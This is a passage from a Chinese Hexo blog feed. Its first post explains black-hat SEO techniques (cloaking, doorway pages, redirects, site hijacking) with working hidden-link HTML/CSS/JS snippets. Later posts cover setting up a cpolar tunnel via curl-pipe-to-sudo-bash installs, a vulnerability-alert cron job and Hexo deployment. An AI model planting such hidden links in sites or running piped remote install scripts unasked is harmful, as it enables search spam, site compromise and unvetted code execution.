Delivery）之间容易混淆。</p><p>IP传送指的是网站程序检查来访者IP地址，然后根据IP地址返回不同的内容。</p><p>区别在于：</p><p>隐藏页面是针对普通用户和搜索引擎蜘蛛返回不同内容</p><p>IP传送是针对不同IP地址返回不同的内容</p><h3 id="隐藏文字"><a href="#隐藏文字" class="headerlink" title="隐藏文字"></a>隐藏文字</h3><p> 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：</p><figure class="highlight x86asm"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> style=<span class="string">"display:none"</span>&gt;隐藏文字&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"><span class="symbol">positon:</span><span class="meta">absolute</span><span class="comment">;</span></span><br><span class="line">margin-right:-1000000px<span class="comment">;</span></span><br></pre></td></tr></tbody></table></figure><p>最简单：</p><p>文字与背景相同，易被检测出来</p><p>改进:</p><p>1.文字放在一个图片背景上，搜索引擎无法准确读取图片内容</p><p>2.使用相近颜色</p><p>3.使用微小文字</p><p>4.使用css文件把文字定位到不可见区域</p><p>用户或竞争对手举报，人工审查简单。</p><h3 id="垃圾链接"><a href="#垃圾链接" class="headerlink" title="垃圾链接"></a>垃圾链接</h3><p> 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。</p><h3 id="链接农场"><a href="#链接农场" class="headerlink" title="链接农场"></a>链接农场</h3><p>链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。</p><p>搜索引擎可能采取以下措施：</p><ul><li>这些页面的链接在计算权重时完全不被考虑</li><li>页面上的链接权重被降低</li><li>页面上的链接权重被惩罚</li><li>这些页面本身重要性被降低</li><li>这些页面本身重要性被降低，同时导出的链接重要性也被降低</li></ul><h3 id="桥页"><a href="#桥页" class="headerlink" title="桥页"></a>桥页</h3><p> 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。</p><ul><li>页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。</li><li>利用页面自动跳转技术。</li></ul><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><h4 id="（一）服务端跳转"><a href="#（一）服务端跳转" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。</p><h4 id="（二）客户端跳转"><a href="#（二）客户端跳转" class="headerlink" title="（二）客户端跳转"></a>（二）客户端跳转</h4><p>客户端跳转分为：http层跳转，应用层跳转。</p><p>应用层跳转分为：html head跳转，js跳转等。</p><p>http层跳转</p><p>http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。</p><p>html head跳转（HTML refresh）</p><p>在html代码的head中添加特殊标签，如下</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">"refresh"</span> <span class="attribute">content</span>=<span class="string">"5"</span>; <span class="attribute">url</span>=<span class="string">"http://thief.one/"</span> /&gt;</span><br></pre></td></tr></tbody></table></figure><p>表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。</p><p>js跳转</p><p>通过在html代码中添加js代码，通过js代码实现跳转：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://thief.one"</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这个跳转应该比html head跳转更向后延迟。</p><h4 id="各种跳转包含关系"><a href="#各种跳转包含关系" class="headerlink" title="各种跳转包含关系"></a>各种跳转包含关系</h4><ul><li>服务端跳转</li><li>客户端跳转<ul><li>http跳转</li><li>应用层跳转<ul><li>html head跳转</li><li>html js跳转</li></ul></li></ul></li></ul><h3 id="各种跳转介绍"><a href="#各种跳转介绍" class="headerlink" title="各种跳转介绍"></a>各种跳转介绍</h3><h4 id="（一）服务端跳转-1"><a href="#（一）服务端跳转-1" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>介绍：跳转发生在服务器上，用户不会有任何感觉。</p><p>优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。</p><p>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。</p><h4 id="（二）http跳转"><a href="#（二）http跳转" class="headerlink" title="（二）http跳转"></a>（二）http跳转</h4><p>介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。</p><p>优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。</p><p>缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。</p><h4 id="（三）html-head跳转"><a href="#（三）html-head跳转" class="headerlink" title="（三）html head跳转"></a>（三）html head跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。</p><p>优点：跳转方式灵活，可以指定延时跳转等等</p><p>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p><h4 id="（四）-js跳转"><a href="#（四）-js跳转" class="headerlink" title="（四） js跳转"></a>（四） js跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到</p><p>优点：跳转方式灵活，可以指定延时跳转等等</p><p>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p><h3 id="关键词堆积"><a href="#关键词堆积" class="headerlink" title="关键词堆积"></a>关键词堆积</h3><p>关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。</p><h3 id="诱饵替换"><a href="#诱饵替换" class="headerlink" title="诱饵替换"></a>诱饵替换</h3><p>诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。</p><h3 id="刷站"><a href="#刷站" class="headerlink" title="刷站"></a>刷站</h3><p>刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。</p><h3 id="挂暗链（黑链）"><a href="#挂暗链（黑链）" class="headerlink" title="挂暗链（黑链）"></a>挂暗链（黑链）</h3><p>手法：利用CSS，利用DIV+JS，利用JS等</p><p>作用：利用高权重网站外链来提升自身站点排名。</p><p> 暗链也称为<em>黑链</em>，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权</p><p>挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。</p><h4 id="利用CSS实现挂暗链"><a href="#利用CSS实现挂暗链" class="headerlink" title="利用CSS实现挂暗链"></a>利用CSS实现挂暗链</h4><h5 id="display属性"><a href="#display属性" class="headerlink" title="display属性"></a>display属性</h5><p>将display属性设置为none，则页面上不显示此内容。</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> style=<span class="string">"display:none;"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">a</span> href=<span class="keyword">http</span>://thief.<span class="literal">one</span>/ &gt;暗链&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。</p><h5 id="color-font-size-line-height属性"><a href="#color-font-size-line-height属性" class="headerlink" title="color/font-size/line-height属性"></a>color/font-size/line-height属性</h5><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="keyword">http</span>://thief.<span class="literal">one</span> style=<span class="string">"color:#FFFFFF;font-size:1px;line-height:1px ;"</span>&gt;暗链&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>分析：最初级的隐蔽链接，易被搜索引擎察觉。</p><h5 id="position属性"><a href="#position属性" class="headerlink" title="position属性"></a>position属性</h5><p>将position位置属性设置成负数，使内容位于页面可见范围以外。</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> style=<span class="string">"position: absolute; top: -999px;left: -999px;"</span>&gt;&lt;<span class="keyword">a</span> href=<span class="keyword">http</span>://thief.<span class="literal">one</span> &gt;暗链&lt;/<span class="keyword">a</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> style=<span class="string">"position:absolute;left:expression_r(1-900);top:expression_r(3-999);"</span>&gt;&lt;<span class="keyword">a</span> href=<span class="keyword">http</span>://thief.<span class="literal">one</span> &gt;暗链&lt;/<span class="keyword">a</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。</p><h5 id="marquee属性"><a href="#marquee属性" class="headerlink" title="marquee属性"></a>marquee属性</h5><p>设置marquee滚动标签属性，使之快速闪现。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">height</span>=<span class="string">1</span> <span class="attr">width</span>=<span class="string">5</span> <span class="attr">scrollamount</span>=<span class="string">3000</span> <span class="attr">scrolldelay</span>=<span class="string">20000</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://thief.one</span> &gt;</span>暗链<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。</p><h4 id="利用JS实现挂暗链"><a href="#利用JS实现挂暗链" class="headerlink" title="利用JS实现挂暗链"></a>利用JS实现挂暗链</h4><p>利用js向页面中写入css代码，设置属性。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"&lt;div style='display:none;'&gt;"</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://thief.one</span>&gt;</span>暗链<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。</p><h5 id="利用DIV-JS实现挂暗链"><a href="#利用DIV-JS实现挂暗链" class="headerlink" title="利用DIV+JS实现挂暗链"></a>利用DIV+JS实现挂暗链</h5><p>利用div与js功能，修改属性。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"anlian"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://thief.one"</span>&gt;</span>暗链<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">javascript</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"anlian"</span>).style.display=<span class="string">"none"</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。</p><h5 id="挂暗链高级姿势"><a href="#挂暗链高级姿势" class="headerlink" title="挂暗链高级姿势"></a>挂暗链高级姿势</h5><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"father"</span> style=<span class="string">"position:relative"</span>&gt;</span><br><span class="line">　　&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"topLever"</span> style=<span class="string">"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee"</span>&gt;遮挡层：可以放图片或者Flash&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">　　&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"hideDontent"</span>&gt;隐蔽层：可以放暗链链接&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。</p><h3 id="网站劫持"><a href="#网站劫持" class="headerlink" title="网站劫持"></a>网站劫持</h3><p>分类：客户端劫持，服务端劫持，快照劫持等</p><p>手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。</p><p>作用：利用高权重网站跳转来引流量。</p><h3 id="利用高权重网站二级目录"><a href="#利用高权重网站二级目录" class="headerlink" title="利用高权重网站二级目录"></a>利用高权重网站二级目录</h3><p>手法：将一些博彩网页放在高权重网站的二级目录之下。</p><p>作用：提高网站排名，引流量。</p><h3 id="利用高权重网站二级目录反向代理"><a href="#利用高权重网站二级目录反向代理" class="headerlink" title="利用高权重网站二级目录反向代理"></a>利用高权重网站二级目录反向代理</h3><p>  通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。</p><hr><p><strong>参考</strong>：</p><p>[搜索引擎优化（搜索优化）_百度百科 (baidu.com)](<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%98%E5%8C%96/3132?fromtitle=SEO&amp;fromid=102990#:~:text=SEO%EF%BC%88Search">https://baike.baidu.com/item/搜索引擎优化/3132?fromtitle=SEO&amp;fromid=102990#:~:text=SEO（Search</a> Engine Optimization）：汉译为搜索引擎优化。是一种方式：利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据 …作 用： 提高有效访问量定 义：,排名 关键词优化概述 · 方法分类 · 优化策略 · 优势)</p><p><a href="https://mp.weixin.qq.com/s/GRPWzOBAvse0i9B8dyoHag">【黑帽SEO系列】基础知识 (qq.com)</a></p><p><a href="http://jiangjunzy.com/kandian/14676.html">什么是泛站群？泛站群有什么作用？ - 值得一看 - 将军网-实用的免费软件下载-安全的绿色软件下载站 (jiangjunzy.com)</a></p><p><a href="https://github.com/Boxser567/SEOChallenge/blob/master/seo-cipher-challenge.pdf">SEOChallenge/seo-cipher-challenge.pdf at master · Boxser567/SEOChallenge · GitHub</a></p><p>[【黑帽SEO系列】暗链 (qq.com)](</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arm32远控</title>
      <link href="/2021/09/05/arm32%E8%BF%9C%E6%8E%A7/"/>
      <url>/2021/09/05/arm32%E8%BF%9C%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="arm32远控"><a href="#arm32远控" class="headerlink" title="arm32远控"></a>arm32远控</h1><p>注册：随意填写</p><p><a href="https://dashboard.cpolar.com/signup">cpolar - secure introspectable tunnels to localhost</a></p><h2 id="cpolar-搭建"><a href="#cpolar-搭建" class="headerlink" title="cpolar 搭建"></a>cpolar 搭建</h2><h4 id="1-cpolar-安装（国内使用）"><a href="#1-cpolar-安装（国内使用）" class="headerlink" title="1. cpolar 安装（国内使用）"></a>1. cpolar 安装（国内使用）</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash</span><br></pre></td></tr></tbody></table></figure><p>或 cpolar短链接安装方式：(国外使用）</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">curl -sL https://git.io/cpolar | sudo bash</span><br></pre></td></tr></tbody></table></figure><h4 id="2-查看版本号，显示3-2-82"><a href="#2-查看版本号，显示3-2-82" class="headerlink" title="2. 查看版本号，显示3.2.82"></a>2. 查看版本号，显示3.2.82</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cpolar version</span><br></pre></td></tr></tbody></table></figure><h4 id="3-token认证"><a href="#3-token认证" class="headerlink" title="3. token认证"></a>3. token认证</h4><p>登录<a href="https://dashboard.cpolar.com/">后台</a>，查看自己的认证token，之后将token贴在命令行里</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cpolar authtoken xxxxxxx</span><br></pre></td></tr></tbody></table></figure><h4 id="4-简单穿透测试"><a href="#4-简单穿透测试" class="headerlink" title="4. 简单穿透测试"></a>4. 简单穿透测试</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cpolar http 8080</span><br></pre></td></tr></tbody></table></figure><p>按ctrl+c退出</p><h4 id="5-向系统添加服务"><a href="#5-向系统添加服务" class="headerlink" title="5. 向系统添加服务"></a>5. 向系统添加服务</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl enable cpolar</span><br></pre></td></tr></tbody></table></figure><h4 id="6-启动cpolar服务"><a href="#6-启动cpolar服务" class="headerlink" title="6. 启动cpolar服务"></a>6. 启动cpolar服务</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl start cpolar</span><br></pre></td></tr></tbody></table></figure><h4 id="7-查看服务状态"><a href="#7-查看服务状态" class="headerlink" title="7. 查看服务状态"></a>7. 查看服务状态</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl status cpolar</span><br></pre></td></tr></tbody></table></figure><h4 id="8-登录后台，查看隧道在线状态"><a href="#8-登录后台，查看隧道在线状态" class="headerlink" title="8. 登录后台，查看隧道在线状态"></a>8. 登录后台，查看隧道在线状态</h4><p><a href="https://dashboard.cpolar.com/status">https://dashboard.cpolar.com/status</a></p><h4 id="9-安装完成"><a href="#9-安装完成" class="headerlink" title="9. 安装完成"></a>9. 安装完成</h4><p>可以去<a href="https://cpolar.com/docs#expose-a-local-web-server-to-the-internet">入门指南</a>进一步了解cpolar的使用方法。</p><h4 id="注-cpolar-卸载方法"><a href="#注-cpolar-卸载方法" class="headerlink" title="注: cpolar 卸载方法"></a>注: cpolar 卸载方法</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash -s -- --remove</span><br></pre></td></tr></tbody></table></figure><h3 id="安装说明："><a href="#安装说明：" class="headerlink" title="安装说明："></a>安装说明：</h3><ul><li>cpolar默认安装路径 /usr/local/bin/cpolar,</li><li>安装脚本会自动配置systemd服务脚本，启动以后，可以开机自启动。</li><li>如果第一次安装，会默认配置一个简单的样例配置文件，创建了两个样例隧道，一个web，一个ssh</li><li>cpolar配置文件路径: /usr/local/etc/cpolar/cpolar.yml</li></ul><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><h4 id="ssh公网远程访问"><a href="#ssh公网远程访问" class="headerlink" title="ssh公网远程访问"></a>ssh公网远程访问</h4><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">ssh 用户名@1.tcp.vip.cpolar.cn -p 20013</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞监控脚本</title>
      <link href="/2021/08/15/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/08/15/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞监控脚本"><a href="#漏洞监控脚本" class="headerlink" title="漏洞监控脚本"></a>漏洞监控脚本</h1><h2 id="钉钉机器人"><a href="#钉钉机器人" class="headerlink" title="钉钉机器人"></a>钉钉机器人</h2><p>添加群助手</p><p>安全设置我选择ip段</p><p><img src="https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/image-20210815184645961.png"></p><p><a href="https://developers.dingtalk.com/document/robots/custom-robot-access/title-jfe-yo9-jl2">自定义机器人接入 - 钉钉开放平台 (dingtalk.com)</a></p><p>阿里云漏洞链接</p><p><a href="https://help.aliyun.com/notice_list_page/9213612/2.html">阿里云帮助中心-阿里云，领先的云计算服务提供商 (aliyun.com)</a></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><a href="https://github.com/yliang54/SecAlert">https://github.com/yliang54/SecAlert</a></p><p>服务器上跑定时任务</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/yliang54/</span>SecAlert.git</span><br><span class="line">cd SecAlert</span><br><span class="line"><span class="comment"># 在VulAlert.py中替换自己钉钉机器人的token</span></span><br></pre></td></tr></tbody></table></figure><p>添加定时任务，用crontab -e进入当前用户的工作表添加以下行，时间和频率可以自己控制。</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">52 </span><span class="number">11</span>  * * * python3 /root/taotao/test/SecAlert/VulAlert.py</span><br></pre></td></tr></tbody></table></figure><p>ubuntu中日志开启</p><p>① 修改 rsyslog</p><figure class="highlight gradle"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim <span class="regexp">/etc/</span>rsyslog.d/<span class="number">50</span>-<span class="keyword">default</span>.conf</span><br></pre></td></tr></tbody></table></figure><p>找到：</p><figure class="highlight lasso"><table><tbody><tr><td class="code"><pre><span class="line">#cron.*                          /<span class="built_in">var</span>/<span class="keyword">log</span>/cron.<span class="keyword">log</span></span><br></pre></td></tr></tbody></table></figure><p>去掉前面的 #</p><p>② 重启 rsyslog</p><figure class="highlight ebnf"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">sudo  service rsyslog  restart</span></span><br></pre></td></tr></tbody></table></figure><p>计划任务No MTA installed, discarding output解决办法</p><p>时任务尾部增加重定向输出到log的参数，例：</p><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">2</span>&gt;&gt;/root/SecAlert/<span class="keyword">error</span>.<span class="built_in">log</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/image-20210815185009083.png"></p><h2 id="利用docker"><a href="#利用docker" class="headerlink" title="利用docker"></a>利用docker</h2><p>由于环境有问题，就利用docker来定时执行</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">docker search python</span><br><span class="line"></span><br><span class="line">docker pull python:3.5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">映射目录并进入docker</span></span><br><span class="line"></span><br><span class="line">docker run -it --name secalert -v /root/SecAlert:/root/SecAlert python:3.5 bash</span><br><span class="line"></span><br><span class="line">cd /root/SecAlert</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">在对应docker面板内，安装对应的python库</span></span><br><span class="line"></span><br><span class="line">pip3 install -i http://mirrors.aliyun.com/pypi/simple/  requests beautifulsoap4</span><br></pre></td></tr></tbody></table></figure><p>在宿主机写个脚本再用corntab定期执行</p><p>shell脚本</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">docker exec -i b5b5f942d303 /bin/bash -c 'python3 /root/SecAlert/VulAlert.py'</span><br></pre></td></tr></tbody></table></figure><p>不能加入-t参数，否则corntab执行shell命令报错，因为无法提供tty终端</p><hr><p>crontab计划任务</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">52 11 * * * sh /root/SecAlert/VulAlert.sh &gt;/dev/null 2&gt;&gt;/root/SecAlert/error.log</span><br></pre></td></tr></tbody></table></figure><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/jgpd130Q0bin039I6BS4xw">https://mp.weixin.qq.com/s/jgpd130Q0bin039I6BS4xw</a></p><p><a href="https://www.cnblogs.com/dee0912/p/4479196.html">Ubuntu 开启 Crontab 计划任务日志 - 韶华休笑 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> python </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Hexo和github搭建博客（2）</title>
      <link href="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/"/>
      <url>/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Hexo和github搭建博客（2）"><a href="#利用Hexo和github搭建博客（2）" class="headerlink" title="利用Hexo和github搭建博客（2）"></a>利用Hexo和github搭建博客（2）</h1><h2 id="增加hexo的安全性"><a href="#增加hexo的安全性" class="headerlink" title="增加hexo的安全性"></a>增加hexo的安全性</h2><p>将用来多地同步的公开hexo分支转移到github私有库</p><ol><li>在github上新建私有库</li></ol><ol start="2"><li>在本机中原有的文件夹运行以下命令<figure class="highlight dsconfig"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">git</span> <span class="string">remote</span> <span class="built_in">set-url</span> <span class="string">origin</span> <span class="string">git</span>@<span class="string">github</span>.<span class="string">com:GreenLeavesl/</span><span class="string">hexo_blog</span>.<span class="string">git</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> -<span class="string">u</span> <span class="string">origin</span> <span class="string">main</span></span><br></pre></td></tr></tbody></table></figure></li><li>删除之前创建的公有库hexo分支</li></ol><h2 id="国内coding搭建hexo"><a href="#国内coding搭建hexo" class="headerlink" title="国内coding搭建hexo"></a>国内coding搭建hexo</h2><p>因为gitee在整改，新用户无法使用page,所以改用coding</p><ol><li>注册<br><a href="https://coding.net/">https://coding.net</a></li><li>coding创建项目<br>coding创建一个公开仓库，仓库名为：用户名。<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/342c403765434b59aa36dda6a046f3c1.png"><br>获取ssh地址<br><a href="mailto:git@e.coding.net">git@e.coding.net</a>:greenleavesl/greenleavesl/greenleavesl.git</li></ol><p>修改_config.yml配置<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/29b78c2631de454dbc29eebdaf8c00a4.png"></p><p>部署公钥<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/77aa41cb9b24473584ce3614a236f454.png"></p><ol start="3"><li>coding 使用 Pages服务<br>点击左侧导航栏项目设置，在项目与成员-&gt;功能开关中打开构建与部属功能<br>返回项目中，可看到左侧导航栏新增“构建与部署”<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/b6b6569efbf846e083315681a30852cb.png"></li></ol><h2 id="域名和cdn加速"><a href="#域名和cdn加速" class="headerlink" title="域名和cdn加速"></a>域名和cdn加速</h2><h3 id="域名"><a href="#域名" class="headerlink" 